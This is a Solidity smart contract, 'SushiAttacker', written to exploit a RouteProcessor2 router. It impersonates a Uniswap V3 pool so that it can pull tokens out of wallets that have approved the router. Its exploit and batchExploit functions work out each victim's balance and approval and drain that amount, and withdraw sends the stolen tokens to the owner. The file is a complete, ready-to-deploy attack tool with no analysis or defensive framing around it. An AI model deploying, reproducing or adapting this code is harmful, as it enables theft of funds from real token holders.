//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IRouteProcessor2 {
    function processRoute(
        address tokenIn,
        uint256 amountIn,
        address tokenOut,
        uint256 amountOutMin,
        address to,
        bytes memory route
    ) external payable returns (uint256 amountOut);

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address);
}

interface IUniswapV3Pool {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function fee() external view returns (uint24);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

/// @title SushiAttacker
/// @notice Exploits RouteProcessor2 vulnerability by impersonating a Uniswap V3 pool
/// @dev Uses fake pool implementation to drain tokens from approved addresses
contract SushiAttacker {
    address public immutable owner;
    IRouteProcessor2 public immutable router;

    int256 private tokenAmount;
    address private token;
    address private victim;
    bytes private payload;
    address private constant PLACEHOLDER_TOKEN = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    constructor(address _router) {
        owner = msg.sender;
        router = IRouteProcessor2(_router);

        payload = abi.encodePacked(
            uint8(1), PLACEHOLDER_TOKEN, uint8(1), uint16(0), uint8(1), address(this), false, address(0)
        );
    }

    /// @notice Executes exploit against a victim who approved router
    function exploit(address _token, address _victim) external {
        require(msg.sender == owner, "Not owner");

        uint256 balance = IERC20(_token).balanceOf(_victim);
        uint256 approved = IERC20(_token).allowance(_victim, address(router));
        uint256 drainAmount = balance <= approved ? balance : approved;

        tokenAmount = int256(drainAmount);
        token = _token;
        victim = _victim;

        router.processRoute(token, 0, token, 0, address(this), payload);
    }

    /// @notice Batch exploit multiple victims
    function batchExploit(address _token, address[] calldata _victims) external {
        require(msg.sender == owner, "Not owner");

        for (uint256 i = 0; i < _victims.length; i++) {
            uint256 balance = IERC20(_token).balanceOf(_victims[i]);
            uint256 approved = IERC20(_token).allowance(_victims[i], address(router));
            uint256 drainAmount = balance <= approved ? balance : approved;

            if (drainAmount > 0) {
                tokenAmount = int256(drainAmount);
                token = _token;
                victim = _victims[i];
                router.processRoute(token, 0, token, 0, address(this), payload);
            }
        }
    }

    /// @notice Fake UniswapV3 pool swap function
    function swap(address, bool, int256, uint160, bytes calldata) external returns (int256 amount0, int256 amount1) {
        router.uniswapV3SwapCallback(tokenAmount, 0, abi.encode(token, victim));
        return (tokenAmount, 0);
    }

    /// @notice Fake UniswapV3 pool token0() function
    function token0() external pure returns (address) {
        return address(0x1111111111111111111111111111111111111111);
    }

    /// @notice Fake UniswapV3 pool token1() function
    function token1() external pure returns (address) {
        return address(0x2222222222222222222222222222222222222222);
    }

    /// @notice Fake UniswapV3 pool fee() function
    function fee() external pure returns (uint24) {
        return 3000;
    }

    /// @notice Withdraw stolen tokens to owner
    function withdraw(address _token) external {
        require(msg.sender == owner, "Not owner");
        uint256 balance = IERC20(_token).balanceOf(address(this));
        IERC20(_token).transfer(owner, balance);
    }

    /// @notice Approve owner to spend tokens
    function approve(address _token, uint256 _amount) external {
        require(msg.sender == owner, "Not owner");
        IERC20(_token).approve(owner, _amount);
    }

    /// @notice Get stolen token balance
    function getStolenBalance(address _token) external view returns (uint256) {
        return IERC20(_token).balanceOf(address(this));
    }
}

